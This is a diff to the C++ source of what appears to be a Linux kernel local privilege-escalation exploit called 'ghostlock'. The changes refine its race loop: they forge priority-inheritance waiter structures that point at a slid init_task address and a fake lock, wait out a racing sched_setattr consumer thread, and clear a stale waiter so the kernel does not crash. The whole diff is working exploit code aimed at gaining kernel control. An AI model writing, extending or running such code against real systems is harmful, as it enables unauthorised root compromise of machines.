@@ -10,6 +10,7 @@
 #include <string>
 #include <utility>
 
+#include "route/route_policy.hpp"   /* route_needs_ghost_disarm (the per-attempt clear) */
 #include "session/runtime_config.h"
 #include "session/runtime_paths.h"
 
@@ -76,7 +77,10 @@ namespace ghostlock::route::select_stack {
 
     void SelectStackRoute::disarm() noexcept {
         race->consumer_go.store(0);
-        if (race->consumer_inflight.load() != 0) {
+        /* Same as the sigreturn twin: a call the attempt loop already found
+         * wedged is not waited on twice -- this poll sleeps through
+         * schedule(), i.e. over the frame that walk is reading. */
+        if (!consumer_stuck && race->consumer_inflight.load() != 0) {
             for (int32_t i = 0;
                  i < 2000 && race->consumer_inflight.load() != 0;
                  i++) {
@@ -527,7 +531,7 @@ namespace ghostlock::route {
                 {5, 0, "pi_pc"},
                 {6, 0, "pi_right"},
                 {7, 0, "pi_left"},
-                {8, (session::g_exploit_session.heap.current.fake_task), "task"},
+                {8, ghostlock::profile::slide_init_task(), "task"},
                 {9, lock_word, "lock"},
                 /* waiter+0x40 is `int prio` on 5.10; 5.15/6.1 put `unsigned int
                  * wake_state` there and prio at +0x44, packed upstream as
@@ -570,7 +574,7 @@ namespace ghostlock::route {
                 {9, 0, "pi_left"},
                 {10, 1, "pi_prio"},
                 {11, 0, "pi_deadline"},
-                {12, (session::g_exploit_session.heap.current.fake_task), "task"},
+                {12, ghostlock::profile::slide_init_task(), "task"},
                 {13, (session::g_exploit_session.heap.current.fake_lock), "lock"},
                 {14, 3, "wake_state"},
             };
@@ -718,21 +722,49 @@ namespace ghostlock::route::select_stack {
                     exception_set.raw(), &timeout);
             }
             select_errno = errno;
+            /* The consumer's call started with the window and is still in the
+             * kernel: the walk reads the stamped fd_set buffer out of THIS
+             * thread's kernel stack, and it outlives the select timeout by
+             * ~200 ms (measured on the sigreturn twin, k81/era-rate). Everything
+             * below writes over that stack -- the restores, the disarm, the
+             * print, and the next attempt's respray -- so the sequence is closed
+             * and the call waited out first
+             * (docs/analysis/consumer-stuck-attempt-protocol-plan.md). */
+            const int32_t drain_ms =
+                    race->wait_consumer_idle(ghostlock::race::PiRace::kConsumerDrainMs);
+            /* The attempt's frame is dead weight from here on: the restores
+             * below are the next syscalls to run over it, and a consumer
+             * sched_setattr walking this thread's pi_blocked_on would read
+             * whatever they leave there -- the 2026-10-14 +0x188 oopses. Clear
+             * the pointer first; see docs/analysis/stale-waiter-lifetime-plan.md. */
+            if (route::route_needs_ghost_disarm(session::g_exploit_session.profile)) {
+                int32_t disarm_errno = 0;
+                (void) support::ghost_disarm("attempt", &disarm_errno);
+            }
             route::restore_standard_io(stdio_backup);
             route::restore_selected_fds();
-            pr_info("pselect post-select attempt=%d/%d compact=%d +%.0fms ret=%d\n",
+            pr_info("pselect post-select attempt=%d/%d compact=%d +%.0fms ret=%d drain=%dms\n",
                     attempt, attempts, layout.compact_waiter.value_or(0),
-                    route::fops_elapsed_ms(&route_t0), select_result);
-            race->consumer_go.store(0);
+                    route::fops_elapsed_ms(&route_t0), select_result, drain_ms);
 
             const int32_t calls = race->consumer_calls.load();
             const int32_t successes = race->consumer_success.load();
             calls_total += calls;
             successes_total += successes;
-            if (calls > 0 && successes > 0) {
+            if (drain_ms >= 0 && calls > 0 && successes > 0) {
                 status.code = ROUTE_OK;
                 status.step = 0;
                 status.error_number = 0;
+                break;
+            }
+            if (drain_ms < 0) {
+                /* The call never came back: a walk is wedged in the kernel, and
+                 * another attempt could only pour more of this thread's writes
+                 * over it. Stop here; the lifecycle's disarm reports the race
+                 * dirty and the caller stops the run. */
+                consumer_stuck = 1;
+                (void) fail(38, 0);
+                status.code = ROUTE_DIRTY_FAILURE;
                 break;
             }
             (void) fail(33, select_errno);
